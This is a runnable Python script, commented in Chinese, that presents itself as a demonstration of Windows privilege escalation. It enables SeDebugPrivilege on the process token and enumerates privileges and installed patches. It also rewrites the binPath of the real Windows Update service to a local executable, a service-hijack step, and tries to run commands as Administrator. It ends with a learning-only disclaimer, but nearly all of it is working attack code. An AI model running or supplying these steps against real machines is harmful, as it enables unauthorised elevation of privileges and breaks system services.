import os
import sys
import ctypes
import subprocess
import time
from ctypes import wintypes

# 定义Windows API常量
SE_DEBUG_NAME = "SeDebugPrivilege"
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_QUERY = 0x0008
SE_PRIVILEGE_ENABLED = 0x0002

class PrivilegeEscalation:
    def __init__(self):
        self.privilege_techniques = [
            "令牌窃取",
            "提权漏洞利用",
            "DLL劫持",
            "服务权限滥用",
            "计划任务权限滥用",
            "注册表权限滥用",
            "内核漏洞利用",
            "横向移动"
        ]
        
        # 加载Windows API
        self.advapi32 = ctypes.WinDLL('advapi32.dll', use_last_error=True)
        self.kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)
        
        # 定义函数原型
        self.advapi32.OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
        self.advapi32.OpenProcessToken.restype = wintypes.BOOL
        
        self.advapi32.LookupPrivilegeValueW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.POINTER(ctypes.c_ulonglong)]
        self.advapi32.LookupPrivilegeValueW.restype = wintypes.BOOL
        
        self.advapi32.AdjustTokenPrivileges.argtypes = [wintypes.HANDLE, wintypes.BOOL, ctypes.POINTER(ctypes.c_byte), wintypes.DWORD, ctypes.POINTER(ctypes.c_byte), ctypes.POINTER(wintypes.DWORD)]
        self.advapi32.AdjustTokenPrivileges.restype = wintypes.BOOL
        
        self.kernel32.GetCurrentProcess.argtypes = []
        self.kernel32.GetCurrentProcess.restype = wintypes.HANDLE
    
    def enable_privilege(self, privilege_name):
        """启用指定的权限"""
        print(f"\n--- 启用权限: {privilege_name} ---")
        
        try:
            # 获取当前进程句柄
            h_process = self.kernel32.GetCurrentProcess()
            
            # 打开进程令牌
            h_token = wintypes.HANDLE()
            if not self.advapi32.OpenProcessToken(h_process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ctypes.byref(h_token)):
                raise Exception(f"无法打开进程令牌: {ctypes.get_last_error()}")
            
            # 查找权限值
            luid = ctypes.c_ulonglong()
            if not self.advapi32.LookupPrivilegeValueW(None, privilege_name, ctypes.byref(luid)):
                raise Exception(f"无法查找权限值: {ctypes.get_last_error()}")
            
            # 准备TOKEN_PRIVILEGES结构
            class LUID_AND_ATTRIBUTES(ctypes.Structure):
                _fields_ = [
                    ("Luid", ctypes.c_ulonglong),
                    ("Attributes", wintypes.DWORD)
                ]
            
            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [
                    ("PrivilegeCount", wintypes.DWORD),
                    ("Privileges", LUID_AND_ATTRIBUTES * 1)
                ]
            
            token_privileges = TOKEN_PRIVILEGES()
            token_privileges.PrivilegeCount = 1
            token_privileges.Privileges[0].Luid = luid.value
            token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
            
            # 调整令牌权限
            if not self.advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(token_privileges), ctypes.sizeof(token_privileges), None, None):
                raise Exception(f"无法调整令牌权限: {ctypes.get_last_error()}")
            
            print(f"成功启用权限: {privilege_name}")
            return True
        except Exception as e:
            print(f"启用权限失败: {str(e)}")
            return False
    
    def get_current_user(self):
        """获取当前用户"""
        try:
            import getpass
            return getpass.getuser()
        except Exception as e:
            print(f"获取当前用户失败: {str(e)}")
            return None
    
    def get_process_privileges(self):
        """获取当前进程的权限"""
        print("\n--- 获取当前进程的权限 ---")
        
        try:
            # 使用whoami命令获取权限
            result = subprocess.run(["whoami", "/priv"], capture_output=True, text=True)
            print(result.stdout)
            return result.stdout
        except Exception as e:
            print(f"获取进程权限失败: {str(e)}")
            return None
    
    def check_admin_privileges(self):
        """检查是否具有管理员权限"""
        print("\n--- 检查管理员权限 ---")
        
        try:
            # 检查是否以管理员身份运行
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            print(f"是否具有管理员权限: {'是' if is_admin else '否'}")
            return is_admin
        except Exception as e:
            print(f"检查管理员权限失败: {str(e)}")
            return False
    
    def run_as_admin(self, command):
        """以管理员身份运行命令"""
        print(f"\n--- 以管理员身份运行命令: {command} ---")
        
        try:
            # 使用runas命令以管理员身份运行
            result = subprocess.run(["runas", "/user:Administrator", command], capture_output=True, text=True)
            print(f"命令输出: {result.stdout}")
            if result.stderr:
                print(f"命令错误: {result.stderr}")
            return result.returncode == 0
        except Exception as e:
            print(f"以管理员身份运行命令失败: {str(e)}")
            return False
    
    def exploit_service(self, service_name):
        """利用服务权限"""
        print(f"\n--- 利用服务权限: {service_name} ---")
        
        try:
            # 检查服务状态
            result = subprocess.run(["sc", "query", service_name], capture_output=True, text=True)
            print(f"服务状态: {result.stdout}")
            
            # 尝试修改服务配置
            # 注意：这需要管理员权限
            test_path = os.path.abspath("test.exe")
            result = subprocess.run(["sc", "config", service_name, f"binPath={test_path}"], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"成功修改服务配置: {service_name}")
            else:
                print(f"修改服务配置失败: {result.stderr}")
            
            return result.returncode == 0
        except Exception as e:
            print(f"利用服务权限失败: {str(e)}")
            return False
    
    def check_vulnerabilities(self):
        """检查系统漏洞"""
        print("\n--- 检查系统漏洞 ---")
        
        try:
            # 检查系统版本
            result = subprocess.run(["ver"], capture_output=True, text=True)
            print(f"系统版本: {result.stdout}")
            
            # 检查已安装的补丁
            result = subprocess.run(["wmic", "qfe", "list", "brief"], capture_output=True, text=True)
            # 只显示前10个补丁
            patches = result.stdout.split('\n')[:10]
            print("已安装的补丁:")
            for patch in patches:
                print(f"  {patch}")
            
            return True
        except Exception as e:
            print(f"检查系统漏洞失败: {str(e)}")
            return False
    
    def demonstrate_privilege_escalation(self):
        """演示权限提升技术"""
        print("=== 权限提升技术演示 ===")
        print("========================")
        
        # 1. 显示权限提升技术列表
        print("\n1. 权限提升技术列表:")
        for i, technique in enumerate(self.privilege_techniques, 1):
            print(f"   {i}. {technique}")
        
        # 2. 检查当前用户和权限
        print("\n2. 检查当前用户和权限:")
        current_user = self.get_current_user()
        print(f"当前用户: {current_user}")
        
        # 检查管理员权限
        self.check_admin_privileges()
        
        # 获取当前进程的权限
        self.get_process_privileges()
        
        # 3. 尝试启用SeDebugPrivilege权限
        print("\n3. 尝试启用SeDebugPrivilege权限:")
        self.enable_privilege(SE_DEBUG_NAME)
        
        # 4. 检查系统漏洞
        print("\n4. 检查系统漏洞:")
        self.check_vulnerabilities()
        
        # 5. 尝试利用服务权限
        print("\n5. 尝试利用服务权限:")
        # 选择一个常见的服务进行测试
        test_service = "wuauserv"  # Windows Update服务
        self.exploit_service(test_service)
        
        # 6. 尝试以管理员身份运行命令
        print("\n6. 尝试以管理员身份运行命令:")
        # 创建一个测试文件
        test_file = "test_admin.txt"
        test_command = f"cmd /c echo Test > {test_file}"
        self.run_as_admin(test_command)
        
        # 清理测试文件
        if os.path.exists(test_file):
            os.remove(test_file)
        
        print("\n=== 演示完成 ===")
        print("通过本演示，你了解了权限提升的基本原理和实现方法。")
        print("请注意：这些技术仅用于学习和防御目的，请勿用于非法活动。")

if __name__ == "__main__":
    if sys.platform != "win32":
        print("此演示仅在Windows平台上运行")
        sys.exit(1)
    
    privilege = PrivilegeEscalation()
    privilege.demonstrate_privilege_escalation()